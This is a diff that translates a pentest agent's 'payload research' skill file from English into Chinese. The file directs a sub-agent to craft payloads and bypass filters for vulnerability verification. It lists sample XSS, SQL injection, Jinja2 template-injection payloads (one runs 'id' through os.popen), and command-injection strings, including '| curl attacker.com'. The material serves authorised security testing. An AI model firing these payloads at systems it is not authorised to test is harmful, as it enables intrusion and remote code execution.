@@ -1,46 +1,46 @@
 ---
 name: payload-research
-description: Payload crafting and bypass research for vulnerability verification
+description: 面向漏洞验证的 Payload 构造与绕过研究
 tags: [pentest, payload, research]
 ---
 
-# Payload Research Skill
+# Payload 研究技能
 
-## When to Use
-Use this skill when you need to research, craft, or refine payloads for vulnerability verification.
+## 适用场景
+当你需要为漏洞验证研究、构造或改进 payload 时，使用本技能。
 
-## Focus Areas
-- Input point analysis: where does user input enter the application?
-- Filter/WAF identification: what gets blocked or sanitized?
-- Encoding research: URL encoding, HTML entities, Unicode, double encoding
-- Bypass techniques: alternative syntax, case variations, null bytes
-- Signal identification: what observable behavior confirms the vulnerability?
+## 重点方向
+- 输入点分析：用户输入从何处进入应用？
+- 过滤器/WAF 识别：哪些内容会被拦截或清洗？
+- 编码研究：URL 编码、HTML 实体、Unicode、双重编码
+- 绕过技巧：替代语法、大小写变化、空字节
+- 信号识别：哪些可观察行为能够确认漏洞存在？
 
-## Payload Categories
+## Payload 类别
 
-### XSS Payloads
-- Basic: `<script>alert(1)</script>`
-- Event handlers: `<img onerror=alert(1) src=x>`
-- SVG: `<svg onload=alert(1)>`
-- Template injection: `{{constructor.constructor('alert(1)')()}}`
+### XSS Payload
+- 基础：`<script>alert(1)</script>`
+- 事件处理器：`<img onerror=alert(1) src=x>`
+- SVG：`<svg onload=alert(1)>`
+- 模板注入：`{{constructor.constructor('alert(1)')()}}`
 
-### SQLi Payloads
-- Detection: `' OR '1'='1`, `1; SELECT 1--`
-- Union: `' UNION SELECT null,null--`
-- Time-based: `'; WAITFOR DELAY '0:0:5'--`
+### SQLi Payload
+- 检测：`' OR '1'='1`、`1; SELECT 1--`
+- 联合查询：`' UNION SELECT null,null--`
+- 基于时间：`'; WAITFOR DELAY '0:0:5'--`
 
-### SSTI Payloads
-- Detection: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
-- Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
+### SSTI Payload
+- 检测：`{{7*7}}`、`${7*7}`、`<%= 7*7 %>`
+- Jinja2：`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
 
-### Command Injection
-- Basic: `; id`, `| id`, `` `id` ``
-- Blind: `; sleep 5`, `| curl attacker.com`
+### 命令注入
+- 基础：`; id`、`| id`、`` `id` ``
+- 盲注：`; sleep 5`、`| curl attacker.com`
 
-## Output Standards
-- Submit canonical machine output through `submit_sub_agent_output` exactly once.
-- Keep `candidate_findings.status` as `candidate` (no final vulnerability verdicts here).
-- If a `hypothesis_id` is provided, all submitted hypotheses/findings must remain on that single hypothesis.
-- If orchestrator state already marks `goal_achieved=true`, default action is stop and hand off to document/report unless deep-dive is explicitly requested.
-- Provide ready-to-use payloads with prerequisites and expected success/failure signals.
-- Optional markdown explanation is allowed, but machine ingestion only reads the submitted JSON payload.
+## 输出规范
+- 通过 `submit_sub_agent_output` 仅提交一次规范的机器可读输出。
+- 保持 `candidate_findings.status` 为 `candidate`（此处不做最终漏洞判定）。
+- 如果提供了 `hypothesis_id`，所有提交的假设/发现都必须保持在该单一假设之下。
+- 如果编排器状态已标记 `goal_achieved=true`，默认动作是停止并移交文档/报告，除非明确要求深入分析。
+- 提供可直接使用的 payload，并附上前提条件以及预期的成功/失败信号。
+- 允许可选的 Markdown 说明，但机器摄入只读取提交的 JSON payload。
